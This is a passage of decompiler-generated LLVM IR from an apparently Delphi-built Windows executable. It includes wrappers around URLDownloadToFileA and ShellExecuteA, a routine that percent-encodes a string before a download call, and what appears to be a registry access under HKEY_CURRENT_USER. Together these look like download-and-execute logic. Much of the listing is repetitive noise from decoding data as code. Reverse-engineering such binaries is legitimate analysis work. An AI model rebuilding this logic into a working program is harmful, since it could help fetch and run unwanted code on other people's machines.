  %658 = add i8 %655, %657, !insn.addr !461
  %659 = inttoptr i32 %656 to i8*, !insn.addr !461
  store i8 %658, i8* %659, align 1, !insn.addr !461
  %660 = load i8, i8* %7, align 4, !insn.addr !462
  %661 = load i32, i32* %eax, align 4
  %662 = trunc i32 %661 to i8, !insn.addr !462
  %663 = add i8 %660, %662, !insn.addr !462
  %664 = inttoptr i32 %661 to i8*, !insn.addr !462
  store i8 %663, i8* %664, align 1, !insn.addr !462
  %665 = load i8, i8* %7, align 4, !insn.addr !463
  %666 = load i32, i32* %eax, align 4
  %667 = trunc i32 %666 to i8, !insn.addr !463
  %668 = add i8 %665, %667, !insn.addr !463
  %669 = inttoptr i32 %666 to i8*, !insn.addr !463
  store i8 %668, i8* %669, align 1, !insn.addr !463
  %670 = load i8, i8* %7, align 4, !insn.addr !464
  %671 = load i32, i32* %eax, align 4
  %672 = trunc i32 %671 to i8, !insn.addr !464
  %673 = add i8 %670, %672, !insn.addr !464
  %674 = inttoptr i32 %671 to i8*, !insn.addr !464
  store i8 %673, i8* %674, align 1, !insn.addr !464
  %675 = load i8, i8* %7, align 4, !insn.addr !465
  %676 = load i32, i32* %eax, align 4
  %677 = trunc i32 %676 to i8, !insn.addr !465
  %678 = add i8 %675, %677, !insn.addr !465
  %679 = inttoptr i32 %676 to i8*, !insn.addr !465
  store i8 %678, i8* %679, align 1, !insn.addr !465
  %680 = load i8, i8* %7, align 4, !insn.addr !466
  %681 = load i32, i32* %eax, align 4
  %682 = trunc i32 %681 to i8, !insn.addr !466
  %683 = add i8 %680, %682, !insn.addr !466
  %684 = inttoptr i32 %681 to i8*, !insn.addr !466
  store i8 %683, i8* %684, align 1, !insn.addr !466
  %685 = load i8, i8* %7, align 4, !insn.addr !467
  %686 = load i32, i32* %eax, align 4
  %687 = trunc i32 %686 to i8, !insn.addr !467
  %688 = add i8 %685, %687, !insn.addr !467
  %689 = inttoptr i32 %686 to i8*, !insn.addr !467
  store i8 %688, i8* %689, align 1, !insn.addr !467
  %690 = load i8, i8* %7, align 4, !insn.addr !468
  %691 = load i32, i32* %eax, align 4
  %692 = trunc i32 %691 to i8, !insn.addr !468
  %693 = add i8 %690, %692, !insn.addr !468
  %694 = inttoptr i32 %691 to i8*, !insn.addr !468
  store i8 %693, i8* %694, align 1, !insn.addr !468
  %695 = load i8, i8* %7, align 4, !insn.addr !469
  %696 = load i32, i32* %eax, align 4
  %697 = trunc i32 %696 to i8, !insn.addr !469
  %698 = add i8 %695, %697, !insn.addr !469
  %699 = inttoptr i32 %696 to i8*, !insn.addr !469
  store i8 %698, i8* %699, align 1, !insn.addr !469
  br label %dec_label_pc_404990, !insn.addr !469

dec_label_pc_404990:                              ; preds = %dec_label_pc_40496f, %dec_label_pc_40490e
  %700 = load i8, i8* %7, align 4, !insn.addr !470
  %701 = load i32, i32* %eax, align 4
  %702 = trunc i32 %701 to i8, !insn.addr !470
  %703 = add i8 %700, %702, !insn.addr !470
  %704 = inttoptr i32 %701 to i8*, !insn.addr !470
  store i8 %703, i8* %704, align 1, !insn.addr !470
  %705 = load i8, i8* %7, align 4, !insn.addr !471
  %706 = load i32, i32* %eax, align 4
  %707 = trunc i32 %706 to i8, !insn.addr !471
  %708 = add i8 %705, %707, !insn.addr !471
  %709 = inttoptr i32 %706 to i8*, !insn.addr !471
  store i8 %708, i8* %709, align 1, !insn.addr !471
  %710 = load i32, i32* %eax, align 4, !insn.addr !471
  ret i32 %710, !insn.addr !471

dec_label_pc_404995:                              ; preds = %dec_label_pc_40490e
  %711 = load i8, i8* %7, align 4
  %712 = load i32, i32* %eax, align 4
  %713 = trunc i32 %712 to i8
  %714 = add i8 %711, %713
  %715 = inttoptr i32 %712 to i8*
  store i8 %714, i8* %715, align 1
  %716 = load i8, i8* %7, align 4
  %717 = load i32, i32* %eax, align 4
  %718 = trunc i32 %717 to i8
  %719 = add i8 %716, %718
  %720 = inttoptr i32 %717 to i8*
  store i8 %719, i8* %720, align 1
  %721 = load i8, i8* %7, align 4
  %722 = load i32, i32* %eax, align 4
  %723 = trunc i32 %722 to i8
  %724 = add i8 %721, %723
  %725 = inttoptr i32 %722 to i8*
  store i8 %724, i8* %725, align 1
  %726 = load i8, i8* %7, align 4
  %727 = load i32, i32* %eax, align 4
  %728 = trunc i32 %727 to i8
  %729 = add i8 %726, %728
  %730 = inttoptr i32 %727 to i8*
  store i8 %729, i8* %730, align 1
  %731 = load i8, i8* %7, align 4
  %732 = load i32, i32* %eax, align 4
  %733 = trunc i32 %732 to i8
  %734 = add i8 %731, %733
  %735 = inttoptr i32 %732 to i8*
  store i8 %734, i8* %735, align 1
  %736 = load i8, i8* %7, align 4
  %737 = load i32, i32* %eax, align 4
  %738 = trunc i32 %737 to i8
  %739 = add i8 %736, %738
  %740 = inttoptr i32 %737 to i8*
  store i8 %739, i8* %740, align 1
  %741 = load i8, i8* %7, align 4
  %742 = load i32, i32* %eax, align 4
  %743 = trunc i32 %742 to i8
  %744 = add i8 %741, %743
  %745 = inttoptr i32 %742 to i8*
  store i8 %744, i8* %745, align 1
  %746 = load i8, i8* %7, align 4
  %747 = load i32, i32* %eax, align 4
  %748 = trunc i32 %747 to i8
  %749 = add i8 %746, %748
  %750 = inttoptr i32 %747 to i8*
  store i8 %749, i8* %750, align 1
  %751 = load i8, i8* %7, align 4
  %752 = load i32, i32* %eax, align 4
  %753 = trunc i32 %752 to i8
  %754 = add i8 %751, %753
  %755 = inttoptr i32 %752 to i8*
  store i8 %754, i8* %755, align 1
  %756 = add i32 %2, -117, !insn.addr !472
  %757 = inttoptr i32 %756 to i8*, !insn.addr !472
  %758 = load i8, i8* %757, align 1, !insn.addr !472
  %759 = trunc i32 %3 to i8, !insn.addr !472
  %760 = add i8 %758, %759, !insn.addr !472
  store i8 %760, i8* %757, align 1, !insn.addr !472
  %761 = call i8 @__asm_in(i16 %5), !insn.addr !473
  %762 = sext i8 %761 to i32, !insn.addr !473
  %763 = load i32, i32* %eax, align 4, !insn.addr !473
  %764 = and i32 %763, -256, !insn.addr !473
  %765 = or i32 %764, %762, !insn.addr !473
  ret i32 %765, !insn.addr !473

dec_label_pc_4049e5:                              ; preds = %dec_label_pc_404948
  %766 = load i32, i32* %eax, align 4, !insn.addr !474
  %767 = call i32 @__readfsdword(i32 %766), !insn.addr !474
  store i32 %767, i32* %stack_var_-12, align 4, !insn.addr !474
  %768 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !474
  %769 = load i32, i32* %eax, align 4, !insn.addr !475
  call void @__writefsdword(i32 %769, i32 %768), !insn.addr !475
  %770 = load i32, i32* @global_var_40968c, align 4, !insn.addr !476
  %771 = add i32 %770, 1, !insn.addr !476
  store i32 %771, i32* @global_var_40968c, align 4, !insn.addr !476
  %772 = load i32, i32* %stack_var_-12, align 4, !insn.addr !477
  call void @__writefsdword(i32 0, i32 %772), !insn.addr !478
  ret i32 0, !insn.addr !479
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !480
  ret i32 %0, !insn.addr !480
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !481
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !482
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !483
  %2 = add i32 %1, -1, !insn.addr !483
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !483
  ret i32 %0, !insn.addr !484
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !485
  ret i32* %0, !insn.addr !485
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !486
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !486
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !486
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !487
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !488
  %3 = add i32 %2, 1, !insn.addr !488
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !488
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !489
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !490
  ret i32 0, !insn.addr !491
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !492
  ret i32 %0, !insn.addr !492
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !493
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !494
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !495
  %2 = add i32 %1, -1, !insn.addr !495
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !495
  ret i32 %0, !insn.addr !496
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !497
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !497
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !497
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !498
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !499
  %3 = add i32 %2, 1, !insn.addr !499
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !499
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !500
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !501
  ret i32 0, !insn.addr !502
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !503
  ret i32 %0, !insn.addr !503
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !504
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !505
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !506
  %2 = add i32 %1, -1, !insn.addr !506
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !506
  ret i32 %0, !insn.addr !507
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !508
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !508
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !508
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !509
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !510
  %3 = add i32 %2, 1, !insn.addr !510
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !510
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !511
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !512
  ret i32 0, !insn.addr !513
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !514
  ret i32 %0, !insn.addr !514
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !515
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !516
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !517
  %2 = add i32 %1, -1, !insn.addr !517
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !517
  ret i32 %0, !insn.addr !518
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !519
  ret i32 %0, !insn.addr !519
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !520
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !520
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !520
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !521
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !522
  %3 = add i32 %2, 1, !insn.addr !522
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !522
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !523
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !524
  ret i32 0, !insn.addr !525
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !526
  ret i32 %0, !insn.addr !526
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !527
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !528
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !529
  %2 = add i32 %1, -1, !insn.addr !529
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !529
  ret i32 %0, !insn.addr !530
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !531
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !532

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !533
  ret i32 %4, !insn.addr !534

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !535
  ret i32 %5, !insn.addr !536
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !537
  %esp.1.reg2mem = alloca i32, !insn.addr !537
  %cf.0.reg2mem = alloca i1, !insn.addr !537
  %esi.0.reg2mem = alloca i32, !insn.addr !537
  %esp.0.reg2mem = alloca i32, !insn.addr !537
  %ebx.0.reg2mem = alloca i32, !insn.addr !537
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !538
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !539
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !539
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !539
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !540
  %4 = call i32 @"@LStrClr"(), !insn.addr !541
  %5 = call i32 @function_4034c8(), !insn.addr !542
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !543
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !543

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !544
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !544
  %9 = inttoptr i32 %8 to i8*, !insn.addr !544
  %10 = load i8, i8* %9, align 1, !insn.addr !544
  %11 = icmp eq i8 %10, 32, !insn.addr !544
  %12 = icmp eq i1 %11, false, !insn.addr !545
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !545

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !546
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !547
  br label %dec_label_pc_404c19, !insn.addr !547

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !548
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !549

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !550
  %16 = icmp ult i8 %15, 95, !insn.addr !551
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !552
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !552

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !553
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !553
  %21 = shl i32 1, %20, !insn.addr !553
  %22 = and i32 %18, %21, !insn.addr !553
  %23 = icmp ne i32 %22, 0, !insn.addr !553
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !553
  br label %dec_label_pc_404ba9, !insn.addr !553

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !554
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !554

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !555
  %27 = add i32 %esp.0.reload, -4, !insn.addr !556
  %28 = inttoptr i32 %27 to i32*, !insn.addr !556
  store i32 %26, i32* %28, align 4, !insn.addr !556
  %29 = add i32 %esp.0.reload, -8, !insn.addr !557
  %30 = inttoptr i32 %29 to i32*, !insn.addr !557
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !557
  %31 = call i32 @function_404b08(), !insn.addr !558
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !559
  %33 = add i32 %esp.0.reload, -12, !insn.addr !560
  %34 = inttoptr i32 %33 to i32*, !insn.addr !560
  store i32 0, i32* %34, align 4, !insn.addr !560
  %35 = call i32 @function_404b08(), !insn.addr !561
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !562
  %37 = add i32 %esp.0.reload, -16, !insn.addr !563
  %38 = inttoptr i32 %37 to i32*, !insn.addr !563
  store i32 0, i32* %38, align 4, !insn.addr !563
  %39 = call i32 @"@LStrCatN"(), !insn.addr !564
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !565
  br label %dec_label_pc_404c19, !insn.addr !565

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !566
  %41 = call i32 @"@LStrCat"(), !insn.addr !567
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !567
  br label %dec_label_pc_404c19, !insn.addr !567

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !568
  %43 = add i32 %esi.0.reload, -1, !insn.addr !569
  %44 = icmp eq i32 %43, 0, !insn.addr !569
  %45 = icmp eq i1 %44, false, !insn.addr !570
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !570
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !570
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !570
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !570
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !570

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !571
  %47 = load i32, i32* %46, align 4, !insn.addr !571
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !572
  %48 = add i32 %esp.2.reload, 8, !insn.addr !573
  %49 = inttoptr i32 %48 to i32*, !insn.addr !573
  store i32 4213835, i32* %49, align 4, !insn.addr !573
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !574
  %51 = call i32 @"@LStrClr"(), !insn.addr !575
  ret i32 %51, !insn.addr !576
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !577
  ret i32 %0, !insn.addr !577
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !578
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !579
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !580
  %2 = inttoptr i32 %0 to i32*, !insn.addr !580
  store i32 %1, i32* %2, align 4, !insn.addr !580
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !581
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !581
  %7 = add i8 %4, %6, !insn.addr !581
  %8 = inttoptr i32 %5 to i8*, !insn.addr !581
  store i8 %7, i8* %8, align 1, !insn.addr !581
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !582
  %10 = load i32, i32* %eax, align 4, !insn.addr !582
  %11 = udiv i32 %10, 256, !insn.addr !582
  %12 = trunc i32 %11 to i8, !insn.addr !582
  %13 = add i8 %9, %12, !insn.addr !582
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !582
  %14 = call i32 @function_4036b8(), !insn.addr !583
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !584
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !584
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !584
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !585
  %17 = call i32 @"@LStrCatN"(), !insn.addr !586
  %18 = call i32 @function_4036c8(), !insn.addr !587
  %19 = inttoptr i32 %18 to i32*, !insn.addr !588
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !588
  call void @__writefsdword(i32 0, i32 0), !insn.addr !589
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !590
  ret i32 %21, !insn.addr !591
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !592
  ret i32 %0, !insn.addr !592
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !593
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !594
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !595
  %5 = inttoptr i32 %3 to i32*, !insn.addr !595
  store i32 %4, i32* %5, align 4, !insn.addr !595
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !596
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !596
  %10 = add i8 %7, %9, !insn.addr !596
  %11 = inttoptr i32 %8 to i8*, !insn.addr !596
  store i8 %10, i8* %11, align 1, !insn.addr !596
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !597
  %14 = udiv i32 %1, 256, !insn.addr !597
  %15 = trunc i32 %14 to i8, !insn.addr !597
  %16 = add i8 %13, %15, !insn.addr !597
  %17 = load i32, i32* %edi, align 4, !insn.addr !597
  %18 = inttoptr i32 %17 to i8*, !insn.addr !597
  store i8 %16, i8* %18, align 1, !insn.addr !597
  %19 = load i8, i8* %6, align 4, !insn.addr !598
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !598
  %22 = add i8 %19, %21, !insn.addr !598
  %23 = inttoptr i32 %20 to i8*, !insn.addr !598
  store i8 %22, i8* %23, align 1, !insn.addr !598
  %24 = add i32 %0, -117, !insn.addr !599
  %25 = inttoptr i32 %24 to i8*, !insn.addr !599
  %26 = load i8, i8* %25, align 1, !insn.addr !599
  %27 = trunc i32 %2 to i8, !insn.addr !599
  %28 = add i8 %26, %27, !insn.addr !599
  store i8 %28, i8* %25, align 1, !insn.addr !599
  %29 = trunc i32 %2 to i16, !insn.addr !600
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !600
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !601
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !601
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !601
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !602
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !603
  %34 = add i32 %33, 1, !insn.addr !603
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !603
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !604
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !605
  ret i32 0, !insn.addr !606
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !607
  ret i32 %0, !insn.addr !607
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !608
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !609
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !610
  %2 = add i32 %1, -1, !insn.addr !610
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !610
  ret i32 %0, !insn.addr !611
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !612
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !613
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !614
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !615
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !616
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !617
  %2 = icmp eq i32 %1, 0, !insn.addr !618
  %3 = icmp eq i1 %2, false, !insn.addr !619
